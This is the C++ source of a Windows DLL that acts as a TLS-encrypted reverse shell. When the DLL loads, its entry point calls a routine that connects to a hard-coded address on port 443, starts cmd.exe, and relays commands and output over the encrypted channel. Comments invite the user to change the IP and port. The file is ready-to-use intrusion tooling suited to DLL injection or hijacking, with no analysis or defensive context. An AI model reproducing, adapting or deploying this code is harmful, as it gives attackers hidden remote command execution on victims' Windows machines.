// dllmain.cpp : Defines the entry point for the DLL application.
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "fwpuclnt.lib")
#pragma comment(lib, "crypt32")

#include "stdafx.h"
#include <string>
#include <iostream>
#include <stdlib.h>
#include <winsock2.h>
#include <WS2tcpip.h>
#include <windows.h>
#include <openssl/ssl.h>

typedef HANDLE PIPE;
using namespace std;


int main() {

	// Change IP, port and shell executable if required
	const char* ip = "192.168.1.249";
	int port = 443;
	wchar_t process[] = L"cmd.exe";

	// Typing this Cmd will cause the program to terminate
	const char* exitCmd = "EXITSHELL\r\n";

	// High bufferSize and high delayWait will result in huge chunks of output to be buffered and sent at one time.
	// Low bufferSize and low delayWait will result in "smooth" terminal experience at the expense of more small packets.  
	const int bufferSize = 4096;
	const int delayWait = 50;

	Sleep(1000);
		
	SOCKET sock = -1;
	WSADATA data = {};
	sockaddr_in sockAddr = {};
	SSL_CTX *sslctx;
	SSL *cSSL;
	int result;

	WSAStartup(MAKEWORD(2, 2), &data);
	sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL);
	// Open socket successful
	if (sock != -1) {
		sockAddr.sin_family = AF_INET;
		inet_pton(AF_INET, ip, &(sockAddr.sin_addr));
		sockAddr.sin_port = htons(port);
		result = WSAConnect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr), NULL, NULL, NULL, NULL);

		// Connection successful
		if (result != -1) {

			SSL_load_error_strings();
			SSL_library_init();
			OpenSSL_add_all_algorithms();
			sslctx = SSL_CTX_new(SSLv23_method());
				
			cSSL = SSL_new(sslctx);
			SSL_set_fd(cSSL, sock);
			result = SSL_connect(cSSL);

			//SSL successful
			if (result != -1)
			{

				char recvBuffer[bufferSize];
				char sendBuffer[bufferSize];
				SSL_write(cSSL, "Client Connected. Press Enter to spawn shell.\r\n", 48);
				memset(recvBuffer, 0, sizeof(recvBuffer));
				result = SSL_read(cSSL, (char *)recvBuffer, sizeof(recvBuffer));
				if (result <= 0) {
					closesocket(sock);
					WSACleanup();
					exit(1);
				}
				else {
					STARTUPINFO sInfo;
					SECURITY_ATTRIBUTES secAttrs;
					PROCESS_INFORMATION procInf;
					PIPE InWrite, InRead, OutWrite, OutRead;
					DWORD bytesReadFromPipe;
					int outputSize;

					secAttrs.nLength = sizeof(SECURITY_ATTRIBUTES);
					secAttrs.bInheritHandle = TRUE;
					secAttrs.lpSecurityDescriptor = NULL;
					CreatePipe(&InWrite, &InRead, &secAttrs, 0);
					CreatePipe(&OutWrite, &OutRead, &secAttrs, 0);


					memset(&sInfo, 0, sizeof(sInfo));
					sInfo.cb = sizeof(sInfo);
					sInfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
					sInfo.hStdInput = OutWrite;
					sInfo.hStdOutput = InRead;
					sInfo.hStdError = InRead;
					CreateProcess(NULL, process, NULL, NULL, TRUE, 0, NULL, NULL, &sInfo, &procInf);

					while (sock != SOCKET_ERROR){
						Sleep(200);
						memset(sendBuffer, 0, sizeof(sendBuffer));
						PeekNamedPipe(InWrite, NULL, NULL, NULL, &bytesReadFromPipe, NULL);
						// while there is output from cmd
						while (bytesReadFromPipe){
							if (!ReadFile(InWrite, sendBuffer, sizeof(sendBuffer), &bytesReadFromPipe, NULL))
								break;
							else{
								SSL_write(cSSL, (char *)sendBuffer, (int) bytesReadFromPipe);
								bytesReadFromPipe = 0;

								// Wait. If there is more output, go to top of loop and continue sending. common for long directory listings
								// duration may not be long enough for commands like systeminfo, in which case, a subsequent enter will display the output
								Sleep(delayWait);
								PeekNamedPipe(InWrite, NULL, NULL, NULL, &bytesReadFromPipe, NULL);
							}	
						}
						
						Sleep(200);
						memset(recvBuffer, 0, sizeof(recvBuffer));
						result = SSL_read(cSSL, (char *)recvBuffer, sizeof(recvBuffer));
						// Got new input from remote end
						if (result > 0) {
							if (strcmp(recvBuffer, exitCmd) == 0) {
								SSL_write(cSSL, "Exiting Shell. Goodbye.\r\n", 26);
								exit(0);
							}
							WriteFile(OutRead, recvBuffer, result, &bytesReadFromPipe, NULL);
							result = 0;
						}

					}

					if (result <= 0) {
						closesocket(sock);
						WSACleanup();
						exit(1);
					}
				}
			}
		}
	}

	exit(1);
	return 0;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		main();
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
